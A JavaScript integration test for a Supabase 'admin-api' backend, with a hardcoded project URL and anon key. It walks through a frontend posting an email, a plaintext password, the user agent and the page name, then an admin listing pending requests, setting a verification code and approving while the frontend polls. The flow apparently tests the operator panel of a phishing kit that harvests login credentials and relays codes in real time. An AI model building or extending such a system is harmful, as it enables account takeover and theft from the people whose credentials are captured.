// FINAL INTEGRATION TEST - COMPLETE SYSTEM CHECK
console.log('🎯 FINAL INTEGRATION TEST - COMPLETE SYSTEM');
console.log('==========================================\n');

const SUPABASE_URL = 'https://nqsdardermkzppeaazbb.supabase.co';
const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc';

const headers = {
    'Authorization': `Bearer ${ANON_KEY}`,
    'apikey': ANON_KEY,
    'Content-Type': 'application/json'
};

let testResults = [];
let totalTests = 0;
let passedTests = 0;

async function runTest(testName, testFunction) {
    totalTests++;
    console.log(`🔄 ${testName}...`);
    
    try {
        const result = await testFunction();
        if (result.success) {
            passedTests++;
            console.log(`✅ ${testName}: PASSED`);
            console.log(`   ${result.message}\n`);
            testResults.push({name: testName, status: 'PASS', message: result.message});
        } else {
            console.log(`❌ ${testName}: FAILED`);
            console.log(`   ${result.message}\n`);
            testResults.push({name: testName, status: 'FAIL', message: result.message});
        }
    } catch (error) {
        console.log(`❌ ${testName}: ERROR`);
        console.log(`   ${error.message}\n`);
        testResults.push({name: testName, status: 'ERROR', message: error.message});
    }
}

// Test 1: Admin API Function Status
async function testAdminAPIStatus() {
    const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/`, { headers });
    
    if (response.status !== 200) {
        return { success: false, message: `Expected 200, got ${response.status}` };
    }
    
    const data = await response.json();
    if (!data.message || !data.message.includes('ADMIN API WORKING')) {
        return { success: false, message: 'API response invalid' };
    }
    
    return { success: true, message: `Status 200, Version: ${data.version || 'Unknown'}` };
}

// Test 2: Submit Login Request (Simulating Frontend)
async function testSubmitLoginRequest() {
    const testEmail = `integration.test.${Date.now()}@example.com`;
    
    const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/request`, {
        method: 'POST',
        headers,
        body: JSON.stringify({
            email: testEmail,
            password: 'integration.test.password',
            userAgent: 'Integration Test Browser',
            currentPage: 'index.html'
        })
    });
    
    if (response.status !== 200) {
        return { success: false, message: `Submit failed with status ${response.status}` };
    }
    
    const data = await response.json();
    if (!data.requestId) {
        return { success: false, message: 'No requestId returned' };
    }
    
    // Store for later tests
    global.testRequestId = data.requestId;
    global.testEmail = testEmail;
    
    return { success: true, message: `Request created with ID: ${data.requestId}` };
}

// Test 3: Get Pending Requests (Simulating Admin GUI)
async function testGetPendingRequests() {
    const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/pending`, { headers });
    
    if (response.status !== 200) {
        return { success: false, message: `Get pending failed with status ${response.status}` };
    }
    
    const data = await response.json();
    if (!Array.isArray(data)) {
        return { success: false, message: 'Response is not an array' };
    }
    
    // Check if our test request is in the list
    const testRequest = data.find(req => req.id === global.testRequestId);
    if (!testRequest) {
        return { success: false, message: 'Test request not found in pending list' };
    }
    
    return { success: true, message: `Found ${data.length} pending requests, including test request` };
}

// Test 4: Check Approval Status (Simulating Frontend Polling)
async function testCheckApprovalStatus() {
    const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/check-approval?email=${encodeURIComponent(global.testEmail)}`, { headers });
    
    if (response.status !== 200) {
        return { success: false, message: `Check approval failed with status ${response.status}` };
    }
    
    const data = await response.json();
    if (data.status !== 'pending') {
        return { success: false, message: `Expected 'pending', got '${data.status}'` };
    }
    
    if (data.id !== global.testRequestId) {
        return { success: false, message: `ID mismatch: expected ${global.testRequestId}, got ${data.id}` };
    }
    
    return { success: true, message: `Approval status: ${data.status}, ID: ${data.id}` };
}

// Test 5: Set Verification Code (Simulating Admin Action)
async function testSetVerificationCode() {
    const testCode = '42';
    
    const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/set-verification-code`, {
        method: 'POST',
        headers,
        body: JSON.stringify({
            email: global.testEmail,
            code: testCode
        })
    });
    
    if (response.status !== 200) {
        const errorData = await response.json();
        return { success: false, message: `Set code failed: ${errorData.message || response.status}` };
    }
    
    const data = await response.json();
    if (!data.success) {
        return { success: false, message: `API returned success: false - ${data.message}` };
    }
    
    return { success: true, message: `Verification code '${testCode}' set successfully` };
}

// Test 6: Approve Request (Simulating Admin Decision)
async function testApproveRequest() {
    const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/approve`, {
        method: 'POST',
        headers,
        body: JSON.stringify({
            id: global.testRequestId,
            decision: 'approved',
            verificationCode: '42'
        })
    });
    
    if (response.status !== 200) {
        const errorData = await response.json();
        return { success: false, message: `Approve failed: ${errorData.error || response.status}` };
    }
    
    const data = await response.json();
    if (!data.success) {
        return { success: false, message: `API returned success: false` };
    }
    
    return { success: true, message: 'Request approved successfully with verification code' };
}

// Test 7: Final Approval Status Check (Simulating Frontend Final Check)
async function testFinalApprovalCheck() {
    const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/check-approval?email=${encodeURIComponent(global.testEmail)}`, { headers });
    
    if (response.status !== 200) {
        return { success: false, message: `Final check failed with status ${response.status}` };
    }
    
    const data = await response.json();
    if (data.status !== 'approved') {
        return { success: false, message: `Expected 'approved', got '${data.status}'` };
    }
    
    if (data.verificationCode !== '42') {
        return { success: false, message: `Expected code '42', got '${data.verificationCode}'` };
    }
    
    return { success: true, message: `Final status: ${data.status}, Code: ${data.verificationCode}` };
}

// Main test runner
async function runAllTests() {
    console.log('🚀 Starting Complete System Integration Test...\n');
    
    await runTest('1. Admin API Function Status', testAdminAPIStatus);
    await runTest('2. Submit Login Request (Frontend Simulation)', testSubmitLoginRequest);
    await runTest('3. Get Pending Requests (Admin GUI Simulation)', testGetPendingRequests);
    await runTest('4. Check Approval Status (Frontend Polling)', testCheckApprovalStatus);
    await runTest('5. Set Verification Code (Admin Action)', testSetVerificationCode);
    await runTest('6. Approve Request (Admin Decision)', testApproveRequest);
    await runTest('7. Final Approval Check (Frontend Completion)', testFinalApprovalCheck);
    
    console.log('==========================================');
    console.log('🏆 FINAL INTEGRATION TEST RESULTS');
    console.log('==========================================');
    console.log(`📊 Total Tests: ${totalTests}`);
    console.log(`✅ Passed: ${passedTests}`);
    console.log(`❌ Failed: ${totalTests - passedTests}`);
    console.log(`📈 Success Rate: ${Math.round((passedTests / totalTests) * 100)}%\n`);
    
    testResults.forEach(result => {
        const icon = result.status === 'PASS' ? '✅' : '❌';
        console.log(`${icon} ${result.name}: ${result.status}`);
    });
    
    console.log('\n==========================================');
    
    if (passedTests === totalTests) {
        console.log('🎉 ALL TESTS PASSED! SYSTEM IS FULLY OPERATIONAL! 🚀');
        console.log('✅ Frontend → Supabase → Database → Admin GUI: COMPLETE INTEGRATION SUCCESS!');
    } else {
        console.log('⚠️  Some tests failed. Check logs above for details.');
    }
    
    console.log('==========================================\n');
}

// Run all tests
runAllTests().catch(console.error); 